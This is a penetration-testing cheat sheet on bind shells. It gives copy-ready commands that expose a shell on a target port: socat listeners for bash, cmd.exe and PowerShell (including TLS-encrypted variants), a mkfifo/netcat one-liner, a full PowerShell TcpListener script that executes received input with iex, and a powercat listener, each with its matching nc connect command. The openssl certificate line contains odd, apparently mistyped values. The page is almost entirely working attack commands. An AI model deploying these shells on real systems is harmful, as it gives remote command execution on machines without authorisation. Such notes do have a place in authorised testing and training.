# Bind shell

Occur when code executed on the target is used to start a listener attached to a shell directly on the target.

**NB: The advantage of not requiring any configuration on your own network, but can be prevented by firewalls protecting the target.**


## Socat

Start a shell listener

```sh
socat TCP-L:<PORT> EXEC:"/bin/bash"
```

```sh
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Connect to the waiting listener

```sh
socat TCP:<TARGET-IP>:<PORT> -
```

### Encrypted shells

Generate a certificate to use encrypted shells

```sh
openssl req --newkey rsa:2028 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Merge the two files into one

```sh
cat shell.key shell.crt > shell.pem
```

Start a listener

```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:"/bin/bash"
```

```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:cmd.exe,pipes
```

Connect to the waiting listener:

```sh
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
```

### Common shells

```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

```sh
nc -nv <TARGET-IP> <PORT>
```

## PowerShell

Execute this in powershell

```sh
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', '443');
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
	$sendback = (iex $data 2>&1 | Out-String);
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
$listener.Stop();
```

```sh
nc -nv <TARGET-IP> 443
```

## PowerCat
It's the powershell version of netcat

```sh
. .\powercat.ps1
powercat -l -p 9001 -ep -rep -v
```

```sh
nc -nv <TARGET-IP> 9001
```
